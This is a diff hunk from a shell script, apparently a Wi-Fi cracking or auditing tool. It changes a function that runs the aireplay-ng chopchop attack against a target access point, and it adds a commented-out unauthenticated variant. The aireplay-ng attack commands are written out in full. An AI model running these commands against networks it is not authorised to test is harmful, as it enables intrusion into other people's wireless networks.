@@ -4118,7 +4118,11 @@ arAttackChopChop(){
 
 	currentTask="arAttackChopChop"
 
-	$terminal aireplay-ng -4 -a $bssid -h $macAddressMonitor $interfaceMonitor &
+	#$terminal aireplay-ng -4 -a $bssid -h $macAddressMonitor $interfaceMonitor &
+	$terminal aireplay-ng -4 -h $macAddressMonitor -b $bssid $interfaceMonitor &
+	
+	# Unauthenticated Method
+	#$terminal aireplay-ng -4 -b $bssid $interfaceMonitor &
 
 }
 
